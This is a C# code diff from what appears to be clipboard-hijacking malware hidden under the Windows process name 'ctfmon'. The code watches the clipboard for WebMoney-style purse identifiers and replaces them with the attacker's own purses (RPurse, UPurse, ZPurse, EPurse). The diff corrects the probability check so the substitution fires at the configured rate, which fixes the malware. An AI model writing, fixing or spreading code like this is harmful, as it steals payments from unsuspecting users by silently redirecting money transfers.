@@ -149,7 +149,7 @@ namespace ctfmon
                 string data = Clipboard.GetText();
                 if (Regex.IsMatch(data, "R[0-9]+", RegexOptions.IgnoreCase) && data != RPurse && Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                 {
-                    if (rand.Next(0, 100) > configChance)
+                    if (rand.Next(0, 100) < configChance)
                     {
                         if (Regex.IsMatch(data, "r") == true)
                         {
@@ -164,7 +164,7 @@ namespace ctfmon
 
                 if (Regex.IsMatch(data, "U[0-9]+", RegexOptions.IgnoreCase) && data != UPurse && Regex.Match(data, "U[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                 {
-                    if (rand.Next(0, 100) > configChance)
+                    if (rand.Next(0, 100) < configChance)
                     {
                         if (Regex.IsMatch(data, "u") == true)
                         {
@@ -179,7 +179,7 @@ namespace ctfmon
 
                 if (Regex.IsMatch(data, "Z[0-9]+", RegexOptions.IgnoreCase) && data != ZPurse && Regex.Match(data, "Z[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                 {
-                    if (rand.Next(0, 100) > configChance)
+                    if (rand.Next(0, 100) < configChance)
                     {
                         if (Regex.IsMatch(data, "z") == true)
                         {
@@ -194,7 +194,7 @@ namespace ctfmon
 
                 if (Regex.IsMatch(data, "E[0-9]+", RegexOptions.IgnoreCase) && data != EPurse && Regex.Match(data, "E[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                 {
-                    if (rand.Next(0, 100) > configChance)
+                    if (rand.Next(0, 100) < configChance)
                     {
                         if (Regex.IsMatch(data, "e") == true)
                         {
